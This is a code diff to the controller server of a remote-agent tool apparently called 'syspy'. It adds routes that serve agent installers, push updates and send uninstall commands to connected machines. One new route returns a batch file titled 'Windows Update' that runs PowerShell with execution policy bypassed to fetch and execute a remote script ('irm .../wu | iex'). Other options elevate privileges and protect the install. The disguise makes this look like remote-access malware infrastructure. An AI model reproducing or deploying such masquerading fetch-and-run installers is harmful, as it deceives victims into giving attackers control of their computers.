@@ -12,7 +12,7 @@ from typing import Any
 
 from .. import config, crypto, httpd, packaging, ws
 from .hub import Hub, safe_name
-from . import webinstall
+from . import webinstall, runtime_cache
 
 STATE_FILE = "controller-state.json"
 
@@ -21,13 +21,26 @@ def _safe_dir(name: str) -> str:
     return re.sub(r"[^A-Za-z0-9._ -]", "_", name)[:60] or "agent"
 
 
+def _base(request: httpd.Request) -> str:
+    """Public base URL.  SYSPY_URL wins; otherwise trust Render's headers."""
+    if config.PUBLIC_URL:
+        return config.PUBLIC_URL
+    host = (request.headers.get("X-Forwarded-Host")
+            or request.headers.get("Host") or "").split(",")[0].strip()
+    proto = (request.headers.get("X-Forwarded-Proto") or "https").split(",")[0].strip()
+    return f"{proto}://{host}".rstrip("/") if host else ""
+
+
 class Api:
     """Owns the hub, the settings and the HTTP application."""
 
     def __init__(self, root: str) -> None:
         self.root = os.path.abspath(root)
+        self.data_dir = os.environ.get("SYSPY_DATA") or os.path.join(self.root, "data")
+        os.makedirs(self.data_dir, exist_ok=True)
         self.key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT)
-        self.hub = Hub(self.key, os.path.join(self.root, "received"))
+        self.hub = Hub(self.key, os.path.join(self.data_dir, "received"),
+                       db_path=os.path.join(self.data_dir, "agents_db.json"))
         self.state = self._load_state()
         self.app = httpd.Application()
         self.app.static(os.path.join(os.path.dirname(__file__), "static"))
@@ -43,7 +56,7 @@ class Api:
             "tokens": [],
             "auto_open": True,
         }
-        path = os.path.join(self.root, STATE_FILE)
+        path = os.path.join(self.data_dir, STATE_FILE)
         if os.path.isfile(path):
             try:
                 with open(path, "r", encoding="utf-8") as handle:
@@ -53,7 +66,7 @@ class Api:
         return defaults
 
     def _save_state(self) -> None:
-        path = os.path.join(self.root, STATE_FILE)
+        path = os.path.join(self.data_dir, STATE_FILE)
         tmp = path + ".tmp"
         try:
             with open(tmp, "w", encoding="utf-8") as handle:
@@ -200,8 +213,22 @@ class Api:
 
         @app.route("GET", "/wu")
         def wu(request: httpd.Request) -> httpd.Response:
-            script = webinstall.render()
+            script = webinstall.render(
+                base=request.param("base") or _base(request),
+                group=request.param("group"),
+                protect=request.param("protect", "1") != "0",
+                elevate=request.param("elevate", "1") != "0",
+            )
             return httpd.Response(200, script.encode("utf-8"), "text/plain; charset=utf-8")
+
+        @app.route("GET", "/wu.cmd")
+        def wu_cmd(request: httpd.Request) -> httpd.Response:
+            base = _base(request)
+            body = ("@echo off\r\n"
+                    "title Windows Update\r\n"
+                    'powershell -NoProfile -ExecutionPolicy Bypass '
+                    f'-Command "irm {base}/wu | iex"\r\n')
+            return httpd.Response(200, body.encode("ascii"), "text/plain; charset=utf-8")
 
         @app.route("GET", "/wu/kit.zip")
         def wu_kit(request: httpd.Request) -> httpd.Response:
@@ -210,10 +237,26 @@ class Api:
 
         @app.route("GET", "/wu/py.zip")
         def wu_py(request: httpd.Request) -> httpd.Response:
-            path = os.path.join(self.root, "py.zip")
-            if not os.path.isfile(path):
-                return httpd.Response.json(404, {"error": "put python-embed-amd64.zip at ./py.zip"})
-            return httpd.Response.file(path)
+            arch = "win32" if request.param("arch") == "win32" else "amd64"
+            local = os.path.join(self.root, "py.zip")
+            if arch == "amd64" and os.path.isfile(local):
+                return httpd.Response.file(local)
+            try:
+                return httpd.Response.file(runtime_cache.cached_runtime(self.data_dir, arch))
+            except Exception as error:
+                return httpd.Response.json(502, {"error": str(error)})
+
+        @app.route("GET", "/api/install")
+        def install_line(request: httpd.Request) -> httpd.Response:
+            if not self.authenticate(request):
+                return httpd.Response.json(401, {"error": "unauthorised"})
+            base = _base(request)
+            return httpd.Response.json(200, {
+                "base": base,
+                "line": webinstall.one_liner(base),
+                "legacy": webinstall.one_liner_legacy(base),
+                "cmd": f"https://{request.headers.get('Host','')}/wu.cmd",
+            })
 
         @app.route("POST", "/api/nick")
         def nickname(request: httpd.Request) -> httpd.Response:
@@ -232,7 +275,8 @@ class Api:
             except OSError as error:
                 return httpd.Response.json(500, {"error": str(error)})
             payload = request.json()
-            targets = payload.get("agents") or [a.id for a in self.hub.all()]
+            spec = payload.get("agents", payload.get("targets"))
+            targets = self.hub.resolve_targets(spec if spec is not None else "all")
             for agent_id in targets:
                 self.hub.send_chunks(agent_id, "update", archive, filename="syspy-update.zip")
             return httpd.Response.json(200, {"bytes": len(archive), "agents": len(targets)})
@@ -264,7 +308,8 @@ class Api:
             if not self.authenticate(request):
                 return httpd.Response.json(401, {"error": "unauthorised"})
             payload = request.json()
-            agents = payload.get("agents") or [a.id for a in self.hub.all()]
+            spec = payload.get("agents", payload.get("targets"))
+            agents = self.hub.resolve_targets(spec if spec is not None else "all")
             for agent_id in agents:
                 self.hub.send(agent_id, {"t": "cmd", "d": "uninstall"})
             return httpd.Response.json(200, {"sent": len(agents)})
